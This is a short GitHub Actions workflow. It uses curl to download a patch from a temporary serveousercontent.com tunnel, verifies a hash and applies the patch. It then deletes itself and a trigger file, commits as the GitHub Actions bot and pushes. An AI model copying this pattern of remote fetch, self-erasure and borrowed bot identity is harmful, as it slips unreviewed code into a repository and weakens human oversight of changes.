name: temp batch-j sync
on:
  push:
    branches:
      - phone/ph-tr-ae-vn-batch-j-current-facts-20260929
permissions:
  contents: write
jobs:
  sync:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: phone/ph-tr-ae-vn-batch-j-current-facts-20260929
          fetch-depth: 0
      - name: Apply verified patch
        shell: bash
        run: |
          set -euo pipefail
          curl -fSL 'https://06a06a89f645819b-47-84-122-196.serveousercontent.com/batch-j.patch' -o /tmp/batch-j.patch
          echo 'b109ad21f0df233b281aa249d49c5fc168e7a8af45499cd4794edc15f3442b98  /tmp/batch-j.patch' | sha256sum -c -
          git apply --check /tmp/batch-j.patch
          git apply /tmp/batch-j.patch
          git rm .github/workflows/temp-batch-j-sync.yml .temp-batch-j-trigger
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'phone: reconcile and migrate PH TR AE VN batch J'
          git push origin HEAD:phone/ph-tr-ae-vn-batch-j-current-facts-20260929
